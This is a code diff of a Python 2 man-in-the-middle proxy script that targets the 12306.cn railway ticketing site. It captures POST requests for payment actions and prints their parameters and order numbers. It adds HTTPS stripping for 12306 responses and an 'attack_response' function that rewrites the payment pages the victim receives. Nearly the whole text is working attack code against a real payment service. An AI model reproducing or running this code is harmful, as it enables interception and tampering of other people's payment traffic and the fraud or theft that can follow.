@@ -3,21 +3,17 @@
 from http import * 
 from urlparse import *
 from cStringIO import StringIO
-import zlib
+import zlib, string
 # import sys, tty, termios
 
 from sinorail import * 
 
 def proxy_mangle_request(req):
-    isTargetReq = False
-    host, port = req.getHost()
-    if host.endswith("12306.cn") :
+    if is_12306(req):
         if req.getMethod() == HTTPRequest.METHOD_POST :
-            path = urlparse(req.getPath()).path
-            action = path[path.rfind("/")+1:]
+            action = get_12306_action(req) 
             reqParams = req.getParams() 
             if action == "confirmPassengerAction.do" and reqParams["method"] == "payOrder" :
-                isTargetReq = True
                 print "************************************************************"
                 print "Capture target request (REQ #%d)" % req.uid
                 print "POST %s:%d %s" % (host, port, req.getPath())
@@ -43,22 +39,29 @@ def proxy_mangle_request(req):
                     i = i+1
                 print "************************************************************"
             elif action == "myOrderAction.do" and reqParams["method"] == "laterEpay":
-                isTargetReq = True 
                 print "************************************************************"
                 print "Capture target request (REQ #%d): POST %s:%d %s" % (req.uid, host, port, req.getPath())
                 print "Order sequence NO: %s" % reqParams["orderSequence_no"]
                 print "************************************************************"
-    return (req, isTargetReq)
+    return req
 
-def proxy_mangle_response(res):
+def proxy_mangle_response(reqres):
+    req, res = reqres.request, reqres.response
+    if is_12306(req) and not is_target(req) :
+        return remove_https(res) 
+    elif is_target(req) :
+        return attack_response(res) 
+    else :
+        return res.serialize()
+
+def attack_response(res):
     data = StringIO(res.serialize())
-    newdata = "" 
     line = data.readline() 
+    newdata = line
     while line != HTTPMessage.EOL :
         # print line
-        newdata += line
         line = data.readline() 
-    newdata += line
+        newdata += line
     if res.isChunked() :
         chunklen = int(data.readline().strip(), 16)
         # print "Chunk length: %d" % chunklen
@@ -75,5 +78,4 @@ def proxy_mangle_response(res):
         parser = RailActiveParser()
         parser.feed(page) 
         newdata += parser.page 
-    
     return newdata
